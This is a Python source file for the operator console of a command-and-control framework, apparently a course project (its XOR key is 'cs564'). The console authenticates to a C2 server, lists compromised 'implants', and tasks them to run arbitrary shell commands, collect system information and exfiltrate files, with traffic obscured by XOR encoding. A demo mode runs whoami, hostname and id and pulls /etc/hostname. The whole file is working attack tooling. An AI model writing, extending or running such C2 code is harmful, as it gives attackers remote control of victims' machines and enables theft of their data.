#!/usr/bin/env python3
import json
import os
import socket
import struct
import sys

C2_HOST = os.environ.get("C2_HOST", "127.0.0.1")
C2_OPERATOR_PORT = int(os.environ.get("C2_OPERATOR_PORT", "9998"))
C2_TOKEN = os.environ.get("OPERATOR_TOKEN", "changeme")

_KEY = b"cs564"


def _xor(data):
    return bytes(b ^ _KEY[i % len(_KEY)] for i, b in enumerate(data))


def _send(conn, data):
    enc = _xor(data)
    conn.sendall(struct.pack(">I", len(enc)) + enc)


def _recv(conn):
    hdr = b""
    while len(hdr) < 4:
        c = conn.recv(4 - len(hdr))
        if not c:
            raise ConnectionError("closed")
        hdr += c
    length = struct.unpack(">I", hdr)[0]
    buf = b""
    while len(buf) < length:
        c = conn.recv(length - len(buf))
        if not c:
            raise ConnectionError("closed")
        buf += c
    return _xor(buf)


def _tx(sock, msg):
    _send(sock, json.dumps(msg).encode())
    return json.loads(_recv(sock).decode())


_HELP = """
Commands:
  list
  task <ID> RUN_CMD <shell command>
  task <ID> SYSINFO
  task <ID> EXFIL_FILE <remote path>
  task <ID> HEARTBEAT
  task <ID> SHUTDOWN
  quit / exit
"""


def _interactive(sock):
    print(_HELP.strip())
    while True:
        try:
            line = input("\nc2> ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not line:
            continue
        if line.lower() in ("quit", "exit"):
            break

        parts = line.split(None, 1)
        verb = parts[0].lower()

        if verb == "list":
            resp = _tx(sock, {"action": "LIST"})
            implants = resp.get("implants", {})
            if not implants:
                print("  (no implants connected)")
            for iid, info in implants.items():
                print("  {0}   {1}".format(iid, info))

        elif verb == "task":
            rest = parts[1] if len(parts) > 1 else ""
            tparts = rest.split(None, 2)
            if len(tparts) < 2:
                print("  Usage: task <implant_id> <COMMAND> [args]")
                continue

            target = tparts[0]
            c2_cmd = tparts[1].upper()
            args = tparts[2] if len(tparts) > 2 else ""

            if c2_cmd == "RUN_CMD":
                payload = {"cmd": args}
            elif c2_cmd == "EXFIL_FILE":
                payload = {"path": args}
            elif c2_cmd in ("HEARTBEAT", "SYSINFO", "SHUTDOWN"):
                payload = {}
            else:
                print("  Unknown command: {0}".format(c2_cmd))
                continue

            resp = _tx(
                sock,
                {
                    "action": "TASK",
                    "target": target,
                    "command": c2_cmd,
                    "payload": payload,
                },
            )
            _print_result(resp)

        else:
            print("  Unknown: {0!r}".format(verb))


def _print_result(resp):
    status = resp.get("status")
    if status == "error":
        print("  ERROR: {0}".format(resp.get("message", resp)))
        return
    result = resp.get("result", {})
    payload = result.get("payload", {})
    if "stdout" in payload:
        print("  stdout:     {0}".format(payload["stdout"] or "(empty)"))
        if payload.get("stderr"):
            print("  stderr:     {0}".format(payload["stderr"]))
        print("  returncode: {0}".format(payload.get("returncode")))
    elif "message" in payload:
        print("  {0}".format(payload["message"]))
    else:
        print(json.dumps(payload, indent=2))


def _demo(sock):
    sep = "=" * 60
    print("\n{0}".format(sep))
    print("  OPERATOR DEMO")
    print(sep)

    resp = _tx(sock, {"action": "LIST"})
    implants = list(resp.get("implants", {}).keys())
    print("\n[LIST] {0}".format(implants))

    if not implants:
        print("  No implants connected.")
        return

    t = implants[0]
    print("  Targeting: {0}\n".format(t))

    tasks = [
        ("HEARTBEAT", {}),
        ("SYSINFO", {}),
        ("RUN_CMD", {"cmd": "whoami"}),
        ("RUN_CMD", {"cmd": "hostname"}),
        ("RUN_CMD", {"cmd": "id"}),
        ("EXFIL_FILE", {"path": "/etc/hostname"}),
    ]

    for command, payload in tasks:
        try:
            resp = _tx(
                sock,
                {"action": "TASK", "target": t, "command": command, "payload": payload},
            )
            result = resp.get("result", {}).get("payload", {})
            summary = result.get("stdout") or result.get("message") or str(result)
            print("  [{0:<14}]  {1}".format(command, str(summary)[:80]))
        except Exception as exc:
            print("  [{0:<14}]  ERROR: {1}".format(command, exc))

    print("\n{0}".format(sep))
    print("  DEMO COMPLETE")
    print("{0}\n".format(sep))


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "interactive"
    print("[op] connecting to {0}:{1}...".format(C2_HOST, C2_OPERATOR_PORT))
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((C2_HOST, C2_OPERATOR_PORT))
        resp = _tx(sock, {"action": "AUTH", "token": C2_TOKEN})
        if resp.get("status") != "ok":
            print("[op] auth failed: {0}".format(resp.get("message")))
            return
        print("[op] authenticated.\n")
        if mode == "demo":
            _demo(sock)
        else:
            _interactive(sock)


if __name__ == "__main__":
    main()
